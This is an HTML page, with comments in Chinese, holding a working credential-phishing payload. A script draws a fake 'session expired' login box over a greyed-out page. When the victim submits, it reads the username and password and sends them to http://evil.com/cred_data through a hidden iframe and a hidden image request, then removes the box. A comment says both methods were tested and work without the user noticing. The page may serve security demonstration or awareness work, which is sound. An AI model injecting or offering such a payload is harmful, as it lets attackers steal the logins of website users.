<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width">
  <title>web</title>
</head>
<body>

  
<h1>Page</h1>
<h3>xxx</h3>
  <br>
  <br>
  <br>
  <br>
<h3>xxx</h3>
  <br>
  <br>
  <br>
  <br>
<button>按钮</button>


<script>

function handle_login()
{
// ----------------
// 获取内容
var user = document.querySelector("#tr_username").value;
var pass = document.querySelector("#tr_password").value;
var receiver_url = "http://evil.com/cred_data";

// ----------------
// 发送内容
// 发送内容 方式1: 创建iframe标签
var iframe1=document.createElement("iframe"); //创建一个iframe 内联框架
iframe1.style.display="none";   //设置样式 隐藏
iframe1.src= receiver_url + "?user=" + user + "&pass=" + pass;
document.body.appendChild(iframe1);

// 发送内容 方式2: 创建img标签
var img1=new Image();
img1.src=receiver_url + "?user=" + user + "&pass=" + pass;
img1.style.display="none";   //设置样式 隐藏
document.body.appendChild(img1);

// 发送内容的方式较多 以上2种都经过了测试 可以无感知获取到表单数据 可以同时使用


// ----------------
// 删除元素
var parent = document.getElementById("parent1");
var child = document.getElementById("child1");
parent.removeChild(child);
}

// ----------------
// 画2个box
// 一个是灰色半透明的大box 一个是诱导登录的小box
document.body.innerHTML += '<div id="parent1"><div id="child1"><div id="grey_out_bg" style=" opacity: 0.5; background: #000; width: 100%;height: 100%; z-index: 99999999;top: 0; left: 0; position: fixed; "></div><div id="cred_box" style="font-family: Tahoma; background-color:#FFF; position: fixed; width: 500px; top: 50%; left: 50%; margin-top: -180px; margin-left: -250px; z-index: 999999999; box-shadow: 0 0 20px #000; border: 1px solid #000"><div id="error_message" style="width: 400px; margin: 20px auto; background-color: #ff9999; border: 1px solid red; font-weight:bold; padding:10px">Your session has expired, please login again!</div><div id="input_creds" style="width: 400px; margin: 20px auto;"><div style="font-weight:bold; width:100px; display:inline-block">Username:</div><input id="tr_username" style="width: 150px; padding: 5px; margin-bottom: 10px"type="text"><br><div style="font-weight:bold; width:100px; display:inline-block">Password:</div><input id="tr_password" style="width: 150px; padding: 5px; margin-bottom: 10px" type="password"><br><button type="button" onclick="handle_login()" style="margin: 10px 0 0 0; padding:10px 20px; width: 100px">Login</button></div></div></div></div>';
 </script>

</body>
</html>
